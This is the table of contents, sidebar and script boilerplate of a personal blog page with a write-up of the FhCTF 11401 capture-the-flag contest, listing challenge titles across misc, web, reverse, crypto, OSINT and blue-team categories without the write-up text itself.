    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanity-check"><span class="toc-number">1.1.</span> <span class="toc-text"> Sanity Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#christmas-tree"><span class="toc-number">1.2.</span> <span class="toc-text"> Christmas Tree</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A7%AD%E5%AE%A2%E7%9A%84%E5%AF%86%E7%A2%BC%E9%A3%9F%E8%AD%9C"><span class="toc-number">1.3.</span> <span class="toc-text"> é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%91%E8%A9%B1%E5%A4%A7%E5%B8%AB"><span class="toc-number">1.4.</span> <span class="toc-text"> ç¬‘è©±å¤§å¸«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB"><span class="toc-number">1.5.</span> <span class="toc-text"> åˆ†äº«åœ–åº«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%9C%96%E5%BA%AB-revenge"><span class="toc-number">1.6.</span> <span class="toc-text"> åˆ†äº«åœ–åº« Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-compile"><span class="toc-number">1.7.</span> <span class="toc-text"> Python Compile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#survey"><span class="toc-number">2.</span> <span class="toc-text"> Survey</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#survey-2"><span class="toc-number">2.1.</span> <span class="toc-text"> Survey</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#internal-login"><span class="toc-number">3.1.</span> <span class="toc-text"> INTERNAL LOGIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-robots"><span class="toc-number">3.2.</span> <span class="toc-text"> Web Robots</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#doors-open"><span class="toc-number">3.3.</span> <span class="toc-text"> Doors Open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-visual-blind-spot"><span class="toc-number">3.4.</span> <span class="toc-text"> The Visual Blind Spot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-root-shell"><span class="toc-number">3.5.</span> <span class="toc-text"> SYSTEM ROOT SHELL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#welcome-to-cybersecurity-jungle"><span class="toc-number">3.6.</span> <span class="toc-text"> Welcome to Cybersecurity Jungle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#templating-danger"><span class="toc-number">3.7.</span> <span class="toc-text"> Templating Danger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#documents"><span class="toc-number">3.8.</span> <span class="toc-text"> Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log-access"><span class="toc-number">3.9.</span> <span class="toc-text"> LOG ACCESS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pathway-leak"><span class="toc-number">3.10.</span> <span class="toc-text"> Pathway-leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kid"><span class="toc-number">3.11.</span> <span class="toc-text"> KID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#something-you-put-into"><span class="toc-number">3.12.</span> <span class="toc-text"> Something You Put Into</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">4.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%A1%E6%98%93%E8%85%B3%E6%9C%AC%E9%96%B1%E8%AE%80%E5%99%A8"><span class="toc-number">4.1.</span> <span class="toc-text"> ç°¡æ˜“è…³æœ¬é–±è®€å™¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#obf"><span class="toc-number">4.2.</span> <span class="toc-text"> OBF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-lock"><span class="toc-number">4.3.</span> <span class="toc-text"> The Lock</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B8-main-%E9%82%8F%E8%BC%AF"><span class="toc-number">4.3.1.</span> <span class="toc-text"> ä¸»å‡½æ•¸ (main) é‚è¼¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%97%E8%AD%89%E5%87%BD%E6%95%B8-check_password-%E5%88%86%E6%9E%90"><span class="toc-number">4.3.2.</span> <span class="toc-text"> é©—è­‰å‡½æ•¸ (check_password) åˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%94%E7%AE%97%E6%B3%95%E9%82%84%E5%8E%9F%E8%88%87%E9%80%86%E5%90%91"><span class="toc-number">4.3.3.</span> <span class="toc-text"> æ¼”ç®—æ³•é‚„åŸèˆ‡é€†å‘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%B5%82%E7%B5%90%E6%9E%9C"><span class="toc-number">4.3.4.</span> <span class="toc-text"> æœ€çµ‚çµæœ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%9E%E6%8E%89%E7%9A%84%E8%A7%A3%E7%A2%BC%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text"> å£æ‰çš„è§£ç¢¼å™¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">5.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86"><span class="toc-number">5.1.</span> <span class="toc-text"> å®‰å…¨çš„åŠ å¯†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode-by-py"><span class="toc-number">5.2.</span> <span class="toc-text"> Encode By Py ğŸ˜˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#des-lv1-%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8F"><span class="toc-number">5.3.</span> <span class="toc-text"> DES Lv.1 - è€èˆ¹é•·çš„å¯¶è—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#des-lv2-%E5%86%8D%E6%8E%A2%E8%80%81%E8%88%B9%E9%95%B7%E7%9A%84%E5%AF%B6%E8%97%8Fwrite-up"><span class="toc-number">5.4.</span> <span class="toc-text"> DES Lv.2 â€“ å†æ¢è€èˆ¹é•·çš„å¯¶è—ï¼ˆWrite-upï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%93%A1%E7%9A%84%E5%AF%86%E7%A2%BC%E6%B4%8B%E8%94%A5"><span class="toc-number">5.5.</span> <span class="toc-text"> ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint"><span class="toc-number">6.</span> <span class="toc-text"> OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#art-work"><span class="toc-number">6.1.</span> <span class="toc-text"> Art Work</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trace-the-landmark"><span class="toc-number">6.2.</span> <span class="toc-text"> Trace the Landmark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B61"><span class="toc-number">6.3.</span> <span class="toc-text"> å³¶1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-fh-gift"><span class="toc-number">6.4.</span> <span class="toc-text"> The FH Gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-1"><span class="toc-number">6.5.</span> <span class="toc-text"> å·¥å•†æ™‚é–“ 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%95%86%E6%99%82%E9%96%93-2"><span class="toc-number">6.6.</span> <span class="toc-text"> å·¥å•†æ™‚é–“ 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lithium-exploration"><span class="toc-number">6.7.</span> <span class="toc-text"> Lithium exploration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srl"><span class="toc-number">6.8.</span> <span class="toc-text"> SRL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B3%B62"><span class="toc-number">6.9.</span> <span class="toc-text"> å³¶2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-1"><span class="toc-number">6.10.</span> <span class="toc-text"> æ¼‚äº®çš„åœ“é ‚ 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%82%E4%BA%AE%E7%9A%84%E5%9C%93%E9%A0%82-2"><span class="toc-number">6.11.</span> <span class="toc-text"> æ¼‚äº®çš„åœ“é ‚ 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%92%E6%88%B4%E5%AE%89%E5%85%A8%E5%B8%BD%E7%9A%84%E9%A8%8E%E5%A3%AB"><span class="toc-number">6.12.</span> <span class="toc-text"> æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exif%E7%9A%84%E6%8B%8D%E6%94%9D%E5%BA%A7%E6%A8%99"><span class="toc-number">6.13.</span> <span class="toc-text"> EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blue-team"><span class="toc-number">7.</span> <span class="toc-text"> Blue team</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E8%A8%82%E5%96%AE"><span class="toc-number">7.1.</span> <span class="toc-text"> å¤§è¨‚å–®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#users-bad-day"><span class="toc-number">7.2.</span> <span class="toc-text"> ğŸ§© Userâ€™s Bad Day</span></a></li></ol></li></ol>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ä¼Šè—¤è’¼å¤ª" class="lazyload">
  <div class="sidebar-author-name">ä¼Šè—¤è’¼å¤ª</div>
  <div class="sidebar-description">Professional Bug Creator</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>æ–‡ç« </div>
    <div class="sidebar-state-number">4</div>
  </div>
  <div class="sidebar-state-category">
    <div>åˆ†é¡</div>
    <div class="sidebar-state-number">3</div>
  </div>
  <div class="sidebar-state-tag">
    <div>æ¨™ç±¤</div>
    <div class="sidebar-state-number">4</div>
  </div>
</div>
<div class="sidebar-social" >
    <div class="icon-email sidebar-social-icon">
      <a href=mailto:me@itousouta15.tw itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/itousouta15 itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-instagram sidebar-social-icon">
      <a href=https://www.instagram.com/itou.souta15 itemprop="url" target="_blank" aria-label="instagram" rel="noopener nofollow noreferrer"></a>
    </div>
    <div class="icon-discord sidebar-social-icon">
      <a href=https://discord.gg/GVhwRRVJ7F itemprop="url" target="_blank" aria-label="discord" rel="noopener nofollow noreferrer"></a>
    </div>
</div>
<div class="sidebar-menu">
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="é¦–é "></a>
          <div class="sidebar-menu-icon icon ">
                &#xf015;
          </div>
        <div class="sidebar-menu-link">é¦–é </div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="æ­¸æª”"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf07c;
          </div>
        <div class="sidebar-menu-link">æ­¸æª”</div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="é—œæ–¼"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf2bd;
          </div>
        <div class="sidebar-menu-link">é—œæ–¼</div>
      </div>
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="å‹éˆ"></a>
          <div class="sidebar-menu-icon icon ">
                &#xf0c0;
          </div>
        <div class="sidebar-menu-link">å‹éˆ</div>
      </div>
</div>
</div>
  </div>
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
</nav>

    </div>
    
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>


  
<script src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js" integrity="sha384-vLev0II0HKFaxkcm+&#x2F;7kX5IGwVFBASkGchU311wmU&#x2F;veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script>



<script src="/js/script.js"></script>


  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>


<script src="/js/pjax_script.js" data-pjax></script>




  <script>
    var setupFirework = () => {
      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
      }
    }
  </script>
  
<script src="https://cdn.jsdelivr.net/npm/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous" onload="setupFirework()" defer></script>


  
<script src="https://cdn.jsdelivr.net/npm/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>

  
<script src="/js/pjax.js"></script>





<div id="lazy-script">
  <div>
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "ä¼Šè—¤è’¼å¤ª",
          title: "FhCTF 11401",
          url: "https://blog.itousouta15.tw/2026/01/01/undefined/",
          excerpt: "Rank 1!!! ä½†æˆ‘åªèƒ½èªªæ‹‰å®Œäº†",
          description: "",
          stripContent: "Rank 1!!! ä½†æˆ‘åªèƒ½èªªæ‹‰å®Œäº†  123452026 FhCTF / Team CTF01.01 â€“ 01.05Group - --------------------------é–‹æ”¾åœ˜è¨‚éº¥ç•¶å‹åº•ä¸‹ç•™è¨€+1--------------------------Final â€” Rank 1ï¼ˆTop 1ï¼‰  Misc  Sanity Check  12345ä¸¦çœ‹å¦‚ä½•ç™¼æ”¾çå‹µã€‚    FhCTF&amp;#123;S3n1ty_Ch3ck1ng....ğŸ˜&amp;#125;æ„Ÿè¬æœ¬æ¬¡æ´»å‹• ISIP.HS çš„æ”¯æ´èˆ‡",
          date: "Thu Jan 01 2026 00:00:00 GMT+0800",
          updated: "Fri Feb 13 2026 20:53:24 GMT+0800",
          cover: "/images/FhCTF.png",
        };
      </script>
        
<script src="/js/insert_highlight.js" data-pjax></script>

      
<script src="/js/tabs.js" data-pjax defer></script>

      <script type="module" data-pjax>
        (async () => {
          const PhotoSwipeLightbox = (await safeImport("https://cdn.jsdelivr.net/npm/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
          const initPswp = (gallery, children) => {
            if (_$$(`${gallery} ${children}`).length > 0) {
              new PhotoSwipeLightbox({
                gallery,
                children,
                pswpModule: () => safeImport("https://cdn.jsdelivr.net/npm/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
              }).init();
            }
          }
          const pswp = () => {
            initPswp('.article-entry', 'a.article-gallery-item');
            initPswp('.article-gallery', 'a.article-gallery-item');
          }
          pswp();
        })();
      </script>
        

<script data-pjax>
  var loadScript = (src, integrity) => {
    const script = document.createElement('script');
    script.src = src;
    if (integrity) script.integrity = integrity;
    script.crossOrigin = 'anonymous';
    return script;
  };

  var commentConfigKeys = ["waline"];
  var commentConfig = {
    waline: {
      enable: true,
      load: async () => {
        const container = document.querySelector('.waline-comment');
        if (!container) return;
        container.style.display = 'block';

        let walineInit;
        const walineCdn = 'https://cdn.jsdelivr.net/npm/@waline/client@2.15.8/dist/waline.mjs';
        const walineIntegrity = 'sha384-9sbqJjrfGjbkI6/PI4nU/MvBfEmkkPC4YK9I4zBeMIf1CVCZdCMH/KinBEAZII/5';

        const module = await safeImport(walineCdn, walineIntegrity);
        walineInit = module.init;

        window.walineInstance = walineInit({
          el: '.waline-comment',
          serverURL: 'https://web-eight-weld-65.vercel.app',
          lang: document.documentElement.lang || 'en',
          locale: {},
          emoji: ["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus","https://unpkg.com/@waline/emojis@1.2.0/bilibili","https://unpkg.com/@waline/emojis@1.2.0/qq","https://unpkg.com/@waline/emojis@1.2.0/tieba","https://unpkg.com/@waline/emojis@1.2.0/tw-emoji"],
          meta: ["nick","mail","link"],
          requiredMeta: ["nick","mail"],
          wordLimit: JSON.parse('0'),
          comment: true,
          pageSize: JSON.parse('10'),
          dark: 'html[data-theme="dark"]',
          pageview: JSON.parse('true'),
        });
      }
    },
  }
  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);

  var defaultComment = '';
  if (commentConfig.enable) {
    // 1. é¦–å…ˆæ£€æŸ¥localStorageä¸­æ˜¯å¦æœ‰ä¿å­˜çš„è¯„è®ºç±»å‹
    var savedCommentType = localStorage.getItem('commentType');
    
    // 2. å¦‚æœlocalStorageä¸­æœ‰å€¼ä¸”å¯¹åº”çš„è¯„è®ºç³»ç»Ÿå¯ç”¨ï¼Œå°±ä½¿ç”¨å®ƒ
    if (savedCommentType) {
      if (commentConfig[savedCommentType]?.enable) {
        defaultComment = savedCommentType;
      }
    }
    
    // 3. å¦‚æœlocalStorageæ— æ•ˆï¼Œæ£€æŸ¥é…ç½®çš„é»˜è®¤è¯„è®ºç³»ç»Ÿ
    if (!defaultComment) {
      var configDefault = 'waline';
      if (commentConfig[configDefault]?.enable) {
        defaultComment = configDefault;
      }
    }
    
    // 4. å¦‚æœå‰ä¸¤é¡¹éƒ½æ— æ•ˆï¼ŒæŒ‰æŒ‡å®šé¡ºåºæ‰¾åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨çš„è¯„è®ºç³»ç»Ÿ
    if (!defaultComment) {
      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
    }
  }
  function loadComments() {
    if (!commentConfig.enable) return;
    const loadedComments = {
      valine: false,
      waline: false,
      twikoo: false,
      gitalk: false,
      giscus: false
    };

    // éšè—æ‰€æœ‰è¯„è®ºå®¹å™¨
    const hideAllComments = () => {
      const commentContainers = document.querySelectorAll('.comment');
      commentContainers.forEach(container => {
        container.style.display = 'none';
      });
    };

    // æŒ‰éœ€åŠ è½½è¯„è®ºç³»ç»Ÿ
    const loadCommentSystem = (type) => {
      if (loadedComments[type]) {
        // å¦‚æœå·²åŠ è½½ï¼Œåªéœ€æ˜¾ç¤ºå¯¹åº”å®¹å™¨
        document.querySelector(`.${type}-comment`).style.display = 'block';
        return;
      }

      // æ ¹æ®ç±»å‹åŠ è½½å¯¹åº”çš„è„šæœ¬
      commentConfig[type]?.load();
      loadedComments[type] = true;
    };

    // è¯„è®ºç»„ä»¶é€‰æ‹©å™¨
    const changeActiveCommentItems = (item) => {
      const commentItems = document.querySelectorAll('.selector-item');
      for (let i = 0; i < commentItems.length; i++) {
        commentItems[i].classList.remove('active');
      }
      item.classList.add('active');

      // è·å–è¦åŠ è½½çš„è¯„è®ºç³»ç»Ÿç±»å‹
      const commentType = item.getAttribute('data-selector');

      // éšè—æ‰€æœ‰è¯„è®ºç³»ç»Ÿ
      hideAllComments();

      // åŠ è½½é€‰ä¸­çš„è¯„è®ºç³»ç»Ÿ
      loadCommentSystem(commentType);
    };

    const commentInit = () => {
      // è¯„è®ºç»„ä»¶é€‰æ‹©å™¨ç‚¹å‡»äº‹ä»¶
      const commentItems = document.querySelectorAll('.selector-item');
      for (let item of commentItems) {
        item.addEventListener('click', () => {
          // ä¿å­˜é€‰æ‹©å™¨çŠ¶æ€
          const commentType = item.getAttribute('data-selector');
          window.localStorage.setItem('commentType', commentType);
          // åˆ‡æ¢é€‰ä¸­çŠ¶æ€
          changeActiveCommentItems(item);
        });
      }

      // æ£€æŸ¥æ˜¯å¦éœ€è¦åŠ è½½é»˜è®¤è¯„è®ºç³»ç»Ÿ
      if (defaultComment) {
        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
        if (!defaultSelectorItem) return;
        defaultSelectorItem.style.display = 'block';
        defaultSelectorItem.classList.add('active');
        loadCommentSystem(defaultComment);
      }
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', commentInit);
    } else {
      commentInit();
    }
  };
  loadComments();
</script>

  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  


  
<script src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>


  
<script src="/js/service_worker.js"></script>



    
<script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha384-Wuix6BuhrWbjDBs24bXrjf4ZQ5aFeFWBuKkFekO2t8xFU0iNaLQfp2K6&#x2F;1Nxveei" crossorigin="anonymous" defer data-pjax></script>

    <script data-pjax>
      window.MathJax = {"tex":{"tags":"ams","useLabelIds":true,"inlineMath":[["$","$"],["\\\\(","\\\\)"]],"displayMath":[["$$","$$"],["\\\\[","\\\\]"]],"processEscapes":true,"processEnvironments":true,"autoload":{"color":[],"colorv2":["color"]},"packages":{"[+]":["noerrors"]}},"options":{"skipHtmlTags":["script","noscript","style","textarea","pre","code"],"ignoreHtmlClass":"tex2jax_ignore","processHtmlClass":"tex2jax_process"},"loader":{"load":["input/asciimath","[tex]/noerrors"]}};
    </script>



  </body>
  </html>
